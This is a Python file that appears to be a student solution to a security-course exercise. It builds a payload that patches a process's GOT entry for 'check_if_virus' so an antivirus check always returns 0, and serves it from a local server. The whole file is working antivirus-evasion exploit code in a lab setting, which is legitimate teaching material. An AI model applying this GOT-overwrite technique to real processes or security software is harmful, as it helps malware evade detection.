import addresses
import evasion

import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'

        # read q3.template as a bytearray
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            data = bytearray(reader.read())

        # find the pid's value placeholder "0x01234567"
        pid_index = data.find(struct.pack("<I", 0x01234567))

        # set the value of the pid 
        data[pid_index: pid_index + 4] = struct.pack("<I", pid)
    

        # find the "check_if_virus" GOT address' value placeholder "0x89ABCDEF"
        check_if_virus_got_address_index = data.find(struct.pack("<I", 0x89ABCDEF))

        # set the value of the GOT address 
        data[check_if_virus_got_address_index: check_if_virus_got_address_index + 4] = \
                    addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT)


        # find the alternative function address' value placeholder "0x76543210"
        alt_func_address_index = data.find(struct.pack("<I", 0x76543210))

        # set the value of the alternative function address 
        data[alt_func_address_index: alt_func_address_index + 4] = \
                    addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE)


        return bytes(data)



    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
